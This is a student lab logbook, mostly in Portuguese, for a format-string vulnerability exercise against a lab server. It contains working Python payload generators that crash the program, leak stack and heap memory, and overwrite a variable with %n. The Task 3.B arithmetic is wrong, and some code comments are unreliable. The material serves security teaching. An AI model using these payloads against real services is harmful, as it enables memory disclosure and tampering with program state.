# LOGBOOK5 - Format-String Vulnerability Lab
## Task 1: Crashing the Program
>Your task is to provide an input to the server, such that when the server program tries to print out
the user input in the myprintf() function, it will crash. You can tell whether the format program has
crashed or not by looking at the container’s printout. If myprintf() returns, it will print out "Returned
properly" and a few smiley faces. If you don’t see them, the format program has probably crashed.
However, the server program will not crash; the crashed format program runs in a child process spawned
by the server program.

<div <div align="justify">
<p>
Para esta tarefa é nos pedido que construamos um input que faça com que o programa 'crash'. Para tal, pensamos em utilizar uma string composta unicamente por %s. Isto deve-se ao facto de que, ao utilizar %s, este obtem o valor que se encontra num localização de memória, e imprime-o. Assim, se colocarmos um número de %s signficativo, o programa poderá tentar aceder a uma localização que esteja protegida ou mesmo aceder a uma localização que não existe, o que irá fazer com que o programa 'crash'.
O input que utilizamos foi o seguinte:
</p>
</div>

```python

#!/usr/bin/python3
import sys


# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))


# This line shows how to construct a string s with
# 10 of "%s"
s = "%s"*10

# The line shows how to store the string s at the beginning of the content
fmt  = (s).encode('latin-1')
content[0:0+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:

  f.write(content)

```

<div <div align="justify">
<p>
Ao gerar o 'badfile' e enviar para o servidor, este 'crashou', como se pode ver na imagem abaixo:

![Crash](uploads/logbook7P1.png)
</p>

<p>
Considerando que o myprintf() não imprimiu os smileys nem a mensagem "Returned properly", podemos concluir que o programa 'crashou'.
</div>

## Task 2: Printing Out the Server Program’s Memory
### 2.A: Stack data
>The goal is to print out the data on the stack. How many %x format specifiers
do you need so you can get the server program to print out the first four bytes of your input? You
can put some unique numbers (4 bytes) there, so when they are printed out, you can immediately tell.
This number will be essential for most of the subsequent tasks, so make sure you get it right.

<div <div align="justify">
<p>
De forma a descobrir o número de %x necessários para imprimir os primeiros 4 bytes do input, precisavamos de utilizar um input ao qual sabiamos o valor em hexadecimal. Assim decidimos utilizar esta string '0000' pois sabiamos que o seu valor em hexadecimal era '0x30303030'. Com isto, conseguimos construir o nosso 'input' que seria constituido de '0000' seguido de um número de %x suficiente (no nosso caso utilizamos 70) para imprimir os primeiros 4 bytes do input. O script que utilizamos para construir o nosso 'input' foi o seguinte:
</p>
</div>

```python

#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte string at offset 0
content[0:4]  =  ("0000").encode('latin-1')

# This line shows how to construct a string s with 70 of ".%.8x"
s =".%.8x"*70

# The line shows how to store the string s at offset 4 after overwriting the 4-byte string above
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)

```

<div <div align="justify">
<p>
Decidimos colocar uma separação entre os %x de forma a que fosse mais fácil de contar o número de %x que tinhamos. Assim, o output que obtivemos foi o seguinte:
</p>

![HEAP](uploads/logbook7P2.png)

</div>

<div <div align="justify">
<p>
Com isto conseguimos concluir que só no 64º %x é que o valor do input é impresso. Assim, o número de %x necessários para imprimir os primeiros 4 bytes do input é 64.
</p>
</div>

### 2.B: Heap data
>There is a secret message (a string) stored in the heap area, and you can find the
address of this string from the server printout. Your job is to print out this secret message. To achieve
this goal, you need to place the address (in the binary form) of the secret message in the format string.

<div <div align="justify">
<p>
Para esta tarefa, percebemos que teriamos que imprimir o conteúdo da heap. Para tal, decidimos que teriamos que utilizar o %s, pois este imprime o conteúdo de uma localização de memória. Considerando que sabiamos o endereço da mensagem secreta, através do output do servidor, percebemos que bastava colocar esse endereço no input, seguido de 63 %x e um %s na posição 64 (que é onde o valor do input é impresso - tal como concluimos na tarefa anterior).

![secretMAdd](uploads/logbook7P3.png)

Assim, e considerando que o endereço da mensagem secreta é 0x080b4008, o nosso input foi gerado com o seguinte scrypt:

```python

#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# The address of the secret message and its convertion to binary
secret_message_address = 0x080b4008
address_bytes = secret_message_address.to_bytes(4, byteorder='little')

# Store the secret message address at offset 4
content[0:4] = address_bytes

# This line shows the 63 %x followed by %s on the 64th position
s = ".%.8x"*63 + ".%s"

# Store the string s at offset 4
fmt = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
    f.write(content)

```

<p>
Com isto, conseguimos imprimir o conteúdo da heap, como se pode ver na imagem abaixo:
</p>

![secretMOutput](uploads/logbook7P4.png)
</div>

## Task 3: Modifying the Server Program’s Memory
>The objective of this task is to modify the value of the target variable that is defined in the server program
(we will continue to use 10.9.0.5). The original value of target is 0x11223344. Assume that this
variable holds an important value, which can affect the control flow of the program. If remote attackers can
change its value, they can change the behavior of this program.

### 3.A: Change the value to a different value.
>In this sub-task, we need to change the content of
the target variable to something else. Your task is considered as a success if you can change it to a
different value, regardless of what value it may be. The address of the target variable can be found
from the server printout.

<div <div align="justify">
<p>
Para esta tarefa, primeiro tivemos que perceber qual o endereço da variável target. Para tal, através do output do servidor, conseguimos perceber que o endereço da variável target é 0x080e5068. </p>

![targetAdd](uploads/logbook7P5.png)

<p>
Com isto, conseguimos construir o nosso input, que seria constituido por 4 bytes que representam o endereço da variável target, seguido de 63 %x e um %n na posição 64. Assim, o nosso input foi gerado com o seguinte scrypt:
</p>

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# Find the address of the target variable and convert it to binary
secret_message_address = 0x080e5068
address_bytes = secret_message_address.to_bytes(4, byteorder='little')

# Store the secret message address at offset 4
content[0:4] = address_bytes

# This line shows the 63 %x followed by %n on the 64th position
s = ".%.8x"*63 + ".%n"

# Store the string s at offset 8
fmt = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
    f.write(content)

```

<p>
Com isto, conseguimos alterar o valor da variável target para 0x0000023C, como se pode ver na imagem abaixo:
</p>

![targetOutput](uploads/logbook7P6.png)

<p>
O valor que obtivemos foi 0x0000023C, que corresponde a 572 em decimal. Isto deve-se ao facto de que o %n escreve o número de bytes que foram impressos até ao momento. Assim, como foram impressos 572 caracteres até ao momento, o valor da variável target foi alterado para 572 = 0x0000023C.
</p>
</div>

### 3.B: Change the value to 0x5000
>In this sub-task, we need to change the content of the
target variable to a specific value 0x5000. Your task is considered as a success only if the variable’s value becomes 0x5000.

<div <div align="justify">
<p>
Para esta tarefa, tivemos que perceber qual o número de caracteres que tinhamos que imprimir até ao momento para que o valor da variável target fosse 0x5000. Considerando que anteriormente tinhamos conseguido alterar o valor da variável target para 572, e que o valor que queriamos obter era 0x5000, tivemos que imprimir 0x5000 - 572 = 0x4A8E = 19086 caracteres. Assim, considerando que eram impressos 63 %x e que cada continha 8 caracteres (%8x), tivemos que alterar este 'input' para que fossem impressos (19086/63) = 316 zeros antes de imprimir os 8 caracteres. Assim, bastava alterar o nosso 'input' para que ficasse da seguinte forma:
</p>

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# Find the address of the secret message and convert it to binary
secret_message_address = 0x080e5068
address_bytes = secret_message_address.to_bytes(4, byteorder='little')

# Store the secret message address at offset 4
content[0:4] = address_bytes

# Construct a string s with the appropriate number of %.324x format specifiers
# The 324 is obtained as follows:
# 1. There was 8 characters printed because of %x
# 2. Considering 0x5000 = 19086, we need to print 19086/63 = 316 zeros before printing the 8 characters.
# 3. Thus, we need 316+8 = 324 characters printed

s = ".%.324x"*63 + ".%.n"

# Store the string s at offset 8
fmt = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
    f.write(content)

```

<p>
Com isto, conseguimos alterar o valor da variável target para 0x5000, como se pode ver na imagem abaixo:
</p>

![targetOutput2](uploads/logbook7P7.png)

